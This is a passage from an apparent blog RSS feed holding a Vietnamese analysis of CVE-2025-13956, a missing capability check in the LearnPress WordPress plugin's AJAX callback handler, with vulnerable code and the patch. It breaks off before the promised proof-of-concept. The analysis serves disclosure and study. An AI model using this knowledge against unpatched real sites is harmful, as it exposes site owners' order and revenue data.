0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Validation không thay thế cho authorization&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_nopriv_*&lt;/code&gt; là bề mặt tấn công công khai&lt;/li&gt;&#xA;&lt;li&gt;Tham số ảnh hưởng truy vấn phải được ràng buộc theo quyền&lt;/li&gt;&#xA;&lt;li&gt;Trả JSON không kiểm soát quyền có thể gây rò rỉ dữ liệu&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/document-library-lite/vulnerability/wordpress-document-library-lite-plugin-1-1-7-insecure-direct-object-references-idor-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Document Library Lite Plugin &amp;lt;= 1.1.7 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-13956 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-16-cve-2025-13956/</link>
      <pubDate>Tue, 16 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-16-cve-2025-13956/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-16-cve-2025-13956/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;LearnPress – WordPress LMS Plugin&lt;/strong&gt; cho &lt;strong&gt;WordPress&lt;/strong&gt; bị &lt;strong&gt;lỗ hổng truy cập trái phép dữ liệu&lt;/strong&gt; do &lt;strong&gt;thiếu kiểm tra quyền (capability check)&lt;/strong&gt; trong &lt;strong&gt;chức năng thống kê&lt;/strong&gt; ở &lt;strong&gt;tất cả các phiên bản đến và bao gồm 4.3.1&lt;/strong&gt;. Điều này cho phép &lt;strong&gt;kẻ tấn công chưa xác thực&lt;/strong&gt; xem &lt;strong&gt;thống kê đơn hàng&lt;/strong&gt; của plugin, bao gồm &lt;strong&gt;tổng doanh thu&lt;/strong&gt; và &lt;strong&gt;số lượng trạng thái đơn hàng&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-13956&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-13956&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.3.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 4.3.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/learnpress/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LearnPress Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;LearnPress&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.3.1&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;4.3.2&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&#xA;  &amp;#39;init&amp;#39;,&#xA;  function () {&#xA;    LoadContentViaAjax::catch_lp_ajax();&#xA;    LessonAjax::catch_lp_ajax();&#xA;    EditCurriculumAjax::catch_lp_ajax();&#xA;    EditQuizAjax::catch_lp_ajax();&#xA;    EditQuestionAjax::catch_lp_ajax();&#xA;    SendEmailAjax::catch_lp_ajax();&#xA;    OpenAiAjax::catch_lp_ajax();&#xA;&#xA;    do_action( &amp;#39;learn-press/register-ajax-handlers&amp;#39; );&#xA;  },&#xA;  11&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;init&lt;/code&gt; hook là hook khởi tạo sớm của WordPress, được chạy sau khi WordPress tải xong các thành phần cốt lõi nhưng trước khi gửi output ra trình duyệt =&amp;gt; Bất kì request của bất kỳ user nào cũng kích hoạt được.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;function () {}&lt;/code&gt; là hàm ẩn danh được đặt làm callback cho hook này.&lt;/p&gt;&#xA;&lt;p&gt;Ở dòng thứ 4, hàm tĩnh &lt;code&gt;LoadContentViaAjax:catch_lp_ajax()&lt;/code&gt; được gọi từ class &lt;code&gt;LoadContentViaAjax&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class LoadContentViaAjax extends AbstractAjax { ... }&#xA;&#xA;abstract class AbstractAjax {&#xA;&#x9;public static function catch_lp_ajax() {&#xA;&#x9;&#x9;if ( ! empty( $_REQUEST[&amp;#39;lp-load-ajax&amp;#39;] ) ) {&#xA;&#x9;&#x9;&#x9;$action = $_REQUEST[&amp;#39;lp-load-ajax&amp;#39;];&#xA;&#x9;&#x9;&#x9;$nonce  = $_REQUEST[&amp;#39;nonce&amp;#39;] ?? &amp;#39;&amp;#39;;&#xA;&#x9;&#x9;&#x9;$class  = new static();&#xA;&#xA;&#x9;&#x9;&#x9;// For case cache html, so cache nonce is not required.&#xA;&#x9;&#x9;&#x9;$class_no_nonce = [&#xA;&#x9;&#x9;&#x9;&#x9;LoadContentViaAjax::class,&#xA;&#x9;&#x9;&#x9;];&#xA;&#xA;&#x9;&#x9;&#x9;if ( ! wp_verify_nonce( $nonce, &amp;#39;wp_rest&amp;#39; ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;if ( ! in_array( get_class( $class ), $class_no_nonce ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;wp_die( &amp;#39;Invalid request!&amp;#39;, 400 );&#xA;&#x9;&#x9;&#x9;&#x9;} else {&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;// Allow to handle without nonce, but must same domain.&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;$referer = wp_get_referer();&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;if ( empty( $referer ) || strpos( $referer, home_url() ) !== 0 ) {&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;wp_die( &amp;#39;Invalid request!&amp;#39;, 400 );&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;&#x9;if ( is_callable( [ $class, $action ] ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;call_user_func( [ $class, $action ] );&#xA;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Class kế thừa&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class LoadContentViaAjax extends AbstractAjax&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;→ &lt;code&gt;LoadContentViaAjax&lt;/code&gt; kế thừa toàn bộ logic xử lý AJAX từ &lt;code&gt;AbstractAjax&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Hook &lt;code&gt;init&lt;/code&gt; gọi &lt;code&gt;catch_lp_ajax()&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Khi WordPress chạy tới hook &lt;code&gt;init&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;LoadContentViaAjax::catch_lp_ajax()&lt;/code&gt; được thực thi.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Kiểm tra request&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! empty( $_REQUEST[&amp;#39;lp-load-ajax&amp;#39;] ) )&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;→ Chỉ xử lý khi request có tham số &lt;code&gt;lp-load-ajax&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Xác định hành động&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$action = $_REQUEST[&amp;#39;lp-load-ajax&amp;#39;];&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;→ Giá trị này được coi là &lt;strong&gt;tên method&lt;/strong&gt; sẽ được gọi trong class con.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Khởi tạo object&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$class = new static();&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;→ &lt;code&gt;static&lt;/code&gt; trỏ tới class đang gọi (&lt;code&gt;LoadContentViaAjax&lt;/code&gt;), nên tạo instance của class đó.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Xử lý nonce&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Lấy &lt;code&gt;nonce&lt;/code&gt; từ request&lt;/li&gt;&#xA;&lt;li&gt;Kiểm tra bằng &lt;code&gt;wp_verify_nonce&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Riêng &lt;code&gt;LoadContentViaAjax&lt;/code&gt; được phép &lt;strong&gt;bỏ qua nonce&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Khi bỏ qua nonce thì kiểm tra &lt;code&gt;referer&lt;/code&gt; cùng domain.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Gọi method tương ứng&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( is_callable( [ $class, $action ] ) ) {&#xA;    call_user_func( [ $class, $action ] );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;→ Nếu trong &lt;code&gt;LoadContentViaAjax&lt;/code&gt; có method trùng tên với giá trị &lt;code&gt;lp-load-ajax&lt;/code&gt;&#xA;→ Method đó sẽ được gọi và thực thi.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;class LoadContentViaAjax extends AbstractAjax {&#xA;&#x9;public function load_content_via_ajax() {&#xA;&#x9;&#x9;$response = new LP_REST_Response();&#xA;&#xA;&#x9;&#x9;try {&#xA;&#x9;&#x9;&#x9;$params = wp_unslash( $_REQUEST[&amp;#39;data&amp;#39;] ?? &amp;#39;&amp;#39; );&#xA;&#x9;&#x9;&#x9;if ( empty( $params ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;throw new Exception( &amp;#39;Error: params invalid!&amp;#39; );&#xA;&#x9;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;&#x9;$params = LP_Helper::json_decode( $params, true );&#xA;&#xA;&#x9;&#x9;&#x9;if ( empty( $params[&amp;#39;callback&amp;#39;] ) ||&#xA;&#x9;&#x9;&#x9;&#x9;! isset( $params[&amp;#39;args&amp;#39;] ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;throw new Exception( &amp;#39;Error: params invalid!&amp;#39; );&#xA;&#x9;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;&#x9;// @var array $args&#xA;&#x9;&#x9;&#x9;$args     = $params[&amp;#39;args&amp;#39;];&#xA;&#x9;&#x9;&#x9;$callBack = $params[&amp;#39;callback&amp;#39;];&#xA;&#xA;&#x9;&#x9;&#x9;if ( empty( $callBack[&amp;#39;class&amp;#39;] ) ||&#xA;&#x9;&#x9;&#x9;&#x9;empty( $callBack[&amp;#39;method&amp;#39;] ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;throw new Exception( &amp;#39;Error: callback invalid!&amp;#39; );&#xA;&#x9;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;&#x9;$class  = $callBack[&amp;#39;class&amp;#39;];&#xA;&#x9;&#x9;&#x9;$method = $callBack[&amp;#39;method&amp;#39;];&#xA;&#xA;&#x9;&#x9;&#x9;// Security: check callback is registered.&#xA;&#x9;&#x9;&#x9;$allow_callbacks = apply_filters(&#xA;&#x9;&#x9;&#x9;&#x9;&amp;#39;lp/rest/ajax/allow_callback&amp;#39;,&#xA;&#x9;&#x9;&#x9;&#x9;[]&#xA;&#x9;&#x9;&#x9;);&#xA;&#x9;&#x9;&#x9;$callBackStr     = $class . &amp;#39;:&amp;#39; . $method;&#xA;&#x9;&#x9;&#x9;if ( ! in_array( $callBackStr, $allow_callbacks ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;throw new Exception( &amp;#39;Error: callback is not register!&amp;#39; );&#xA;&#x9;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;&#x9;// Check class and method is callable.&#xA;&#x9;&#x9;&#x9;if ( is_callable( [ $class, $method ] ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;$data = call_user_func( [ $class, $method ], $args );&#xA;&#x9;&#x9;&#x9;} else {&#xA;&#x9;&#x9;&#x9;&#x9;throw new Exception( &amp;#39;Error: callback is not callable!&amp;#39; );&#xA;&#x9;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;&#x9;if ( ! $data instanceof stdClass &amp;amp;&amp;amp; ! isset( $data-&amp;gt;content ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;throw new Exception( &amp;#39;Error: data content invalid!&amp;#39; );&#xA;&#x9;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;&#x9;$response-&amp;gt;message = $data-&amp;gt;message ?? &amp;#39;&amp;#39;;&#xA;&#x9;&#x9;&#x9;unset( $data-&amp;gt;message );&#xA;&#xA;&#x9;&#x9;&#x9;$response-&amp;gt;status = &amp;#39;success&amp;#39;;&#xA;&#x9;&#x9;&#x9;$response-&amp;gt;data   = $data;&#xA;&#x9;&#x9;} catch ( Throwable $e ) {&#xA;&#x9;&#x9;&#x9;$response-&amp;gt;status  = &amp;#39;error&amp;#39;;&#xA;&#x9;&#x9;&#x9;$response-&amp;gt;message = $e-&amp;gt;getMessage();&#xA;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;wp_send_json( $response );&#xA;&#x9;}&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Các biến cần thiết cho &lt;code&gt;call_user_func&lt;/code&gt; được hình thành trực tiếp từ chính đoạn code này và liên kết với nhau theo đúng luồng xử lý:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$params = LP_Helper::json_decode( $params, true );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Biến &lt;code&gt;$params&lt;/code&gt; là mảng dữ liệu đầu vào sau khi giải mã JSON từ request, trong đó bắt buộc phải có thông tin callback và tham số.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$args     = $params[&amp;#39;args&amp;#39;];&#xA;$callBack = $params[&amp;#39;callback&amp;#39;];&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$args&lt;/code&gt; chứa các tham số sẽ được truyền vào hàm được gọi, còn &lt;code&gt;$callBack&lt;/code&gt; mô tả callback cần thực thi.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$class  = $callBack[&amp;#39;class&amp;#39;];&#xA;$method = $callBack[&amp;#39;method&amp;#39;];&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hai biến này xác định chính xác &lt;strong&gt;class&lt;/strong&gt; và &lt;strong&gt;phương thức&lt;/strong&gt; sẽ được gọi động.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$callBackStr = $class . &amp;#39;:&amp;#39; . $method;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Chuỗi này được dùng để đối chiếu với danh sách callback được phép trong &lt;code&gt;$allow_callbacks&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Hàng loạt các callback được đăng ký cho filter &lt;code&gt;lp/rest/ajax/allow_callback&lt;/code&gt; thông qua hàm &lt;code&gt;add_filter&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;https://w41bu1.github.io/posts/2025-12-11-cve-2025-11368/filter.png&#34; title=&#34;Đăng ký callback cho filter lp/rest/ajax/allow_callback&#34; data-thumbnail=&#34;https://w41bu1.github.io/posts/2025-12-11-cve-2025-11368/filter.png&#34; data-sub-html=&#34;&lt;h2&gt;Filter&lt;/h2&gt;&lt;p&gt;Đăng ký callback cho filter lp/rest/ajax/allow_callback&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;https://w41bu1.github.io/posts/2025-12-11-cve-2025-11368/filter.png&#39; alt=&#34;Filter&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Đăng ký callback cho filter lp/rest/ajax/allow_callback&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function allow_callback( array $callbacks ): array {&#xA;  $callbacks[] = get_class( $this ) . &amp;#39;:render_edit_quiz&amp;#39;;&#xA;  $callbacks[] = get_class( $this ) . &amp;#39;:render_list_items_not_assign&amp;#39;;&#xA;&#xA;  return $callbacks;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm nhận mảng &lt;code&gt;$callbacks&lt;/code&gt; hiện có, sau đó thêm vào hai chuỗi dạng &lt;code&gt;TênClass:method&lt;/code&gt; của class hiện tại, rồi trả lại mảng đó để WordPress sử dụng làm danh sách callback hợp lệ. Khi debug, ta sẽ thấy toàn bộ các callback được đăng ký:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;https://w41bu1.github.io/posts/2025-12-11-cve-2025-11368/allow.png&#34; title=&#34;Danh sách các callback hợp lệ&#34; data-thumbnail=&#34;https://w41bu1.github.io/posts/2025-12-11-cve-2025-11368/allow.png&#34; data-sub-html=&#34;&lt;h2&gt;Allow&lt;/h2&gt;&lt;p&gt;Danh sách các callback hợp lệ&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;https://w41bu1.github.io/posts/2025-12-11-cve-2025-11368/allow.png&#39; alt=&#34;Allow&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Danh sách các callback hợp lệ&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( is_callable( [ $class, $method ] ) ) {&#xA;    $data = call_user_func( [ $class, $method ], $args );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Mảng &lt;code&gt;[ $class, $method ]&lt;/code&gt; chính là callback hợp lệ mà &lt;code&gt;call_user_func&lt;/code&gt; yêu cầu. Khi điều kiện &lt;code&gt;is_callable&lt;/code&gt; đúng, WordPress sẽ gọi phương thức &lt;code&gt;$method&lt;/code&gt; của class &lt;code&gt;$class&lt;/code&gt; và truyền biến &lt;code&gt;$args&lt;/code&gt; làm tham số duy nhất cho phương thức đó.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Lỗi&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;strong&gt;Lỗ hổng phát sinh do API không thực hiện bất kỳ kiểm tra quyền (capability/permission) nào.&lt;/strong&gt; Điều này cho phép mọi người dùng – kể cả không có quyền quản trị – gọi vào endpoint và yêu cầu thực thi bất kỳ callback nào nằm trong danh sách callback hợp lệ, dù những callback đó lẽ ra chỉ dành cho admin.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Bản vá (v4.3.2)&lt;/strong&gt; bổ sung vào hàm &lt;code&gt;load_content_via_ajax&lt;/code&gt; bước xác thực quyền bằng cách cố định danh sách callback được phép gọi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$allow_callbacks = apply_filters(&#xA;    &amp;#39;lp/rest/ajax/allow_callback&amp;#39;,&#xA;    [&#xA;        &amp;#39;LP_Admin_Dashboard:order_statistic&amp;#39;,&#xA;        &amp;#39;LP_Admin_Dashboard:plugin_status_content&amp;#39;,&#xA;    ]&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Chỉ những callback có tên class và method khớp chính xác với &lt;code&gt;&#39;LP_Admin_Dashboard:order_statistic&#39;&lt;/code&gt; hoặc &lt;code&gt;&#39;LP_Admin_Dashboard:plugin_status_content&#39;&lt;/code&gt; mới vượt qua được kiểm tra.&lt;/p&gt;&#xA;&lt;p&gt;Hàm 